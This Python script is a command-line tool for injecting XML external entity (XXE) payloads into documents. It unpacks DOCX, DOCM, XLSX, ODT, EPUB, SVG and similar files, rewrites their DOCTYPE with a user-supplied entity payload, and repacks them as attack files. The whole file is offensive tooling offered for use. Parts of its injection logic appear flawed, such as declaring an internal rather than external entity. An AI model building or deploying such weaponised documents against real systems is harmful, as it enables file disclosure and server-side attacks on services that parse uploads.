import zipfile
import os
import re
import xml.etree.ElementTree as ET
import tempfile
import argparse

FILE_TYPES = {
    'xlsx': ['xl/workbook.xml', 'xl/sharedStrings.xml', 'xl/worksheets/sheet1.xml'],
    'docx': ['word/document.xml', 'word/styles.xml', 'word/numbering.xml'],
    'odt': ['content.xml', 'styles.xml'],
    'ods': ['content.xml', 'styles.xml'],
    'odp': ['content.xml', 'styles.xml'],
    'epub': ['OEBPS/content.opf', 'OEBPS/toc.ncx'],
    'svg': ['.'],
    'xml': ['.'],
    'rss': ['.'],
    'xhtml': ['.'],
    'docm': ['word/document.xml', 'word/styles.xml', 'word/numbering.xml']
}

def unpack_file(input_file, temp_dir):
    if zipfile.is_zipfile(input_file):
        with zipfile.ZipFile(input_file, 'r') as zip_ref:
            zip_ref.extractall(temp_dir)
    else:
        with open(input_file, 'r', encoding='utf-8') as f:
            content = f.read()
        with open(os.path.join(temp_dir, os.path.basename(input_file)), 'w', encoding='utf-8') as f:
            f.write(content)

def repack_file(temp_dir, output_file):
    if output_file.endswith(('.svg', '.xml', '.rss', '.xhtml')):
        with open(os.path.join(temp_dir, os.path.basename(output_file)), 'r', encoding='utf-8') as f:
            content = f.read()
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(content)
    else:
        with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for root, _, files in os.walk(temp_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, temp_dir)
                    zip_ref.write(file_path, arcname)

def inject_xxe_payload(temp_dir, payload, file_type):
    target_files = FILE_TYPES.get(file_type, ['.'])
    
    for file in target_files:
        file_path = os.path.join(temp_dir, file)
        if file == '.' or os.path.exists(file_path):
            if file == '.':
                file_path = os.path.join(temp_dir, os.listdir(temp_dir)[0])
            
            with open(file_path, 'r', encoding='utf-8') as f:
                content = f.read()
            
            content_without_declaration = re.sub(r'<\?xml[^>]*\?>', '', content, flags=re.DOTALL)
            content_without_doctype = re.sub(r'<!DOCTYPE[^>]*>', '', content_without_declaration, flags=re.DOTALL)
            
            try:
                root = ET.fromstring(content_without_doctype)
                root_element_name = root.tag.split('}')[-1]
                
                new_doctype = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE {root_element_name} [
<!ENTITY payload "{payload}">
]>'''
                
                new_content = ET.tostring(root, encoding='unicode')
                new_content = new_content.replace('payload', '&payload;')
                
                final_content = new_doctype + new_content
                
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(final_content)
            except ET.ParseError:
                print(f"Warning: Could not parse {file_path}. Skipping this file.")

def automate_xxe_injection(input_file, output_file, payload):
    file_type = os.path.splitext(input_file)[1][1:].lower()
    if file_type not in FILE_TYPES:
        raise ValueError(f"Unsupported file type: {file_type}")

    with tempfile.TemporaryDirectory() as temp_dir:
        unpack_file(input_file, temp_dir)
        inject_xxe_payload(temp_dir, payload, file_type)
        repack_file(temp_dir, output_file)

def main():
    parser = argparse.ArgumentParser(description='Inject XXE payload into various file formats')
    parser.add_argument('-i', '--input', required=True, help='Input file')
    parser.add_argument('-o', '--output', required=True, help='Output file')
    parser.add_argument('-p', '--payload', required=True, help='XXE payload to inject')
    
    args = parser.parse_args()
    
    automate_xxe_injection(args.input, args.output, args.payload)
    print(f"Payload injected. Output file: {args.output}")

if __name__ == "__main__":
    main()
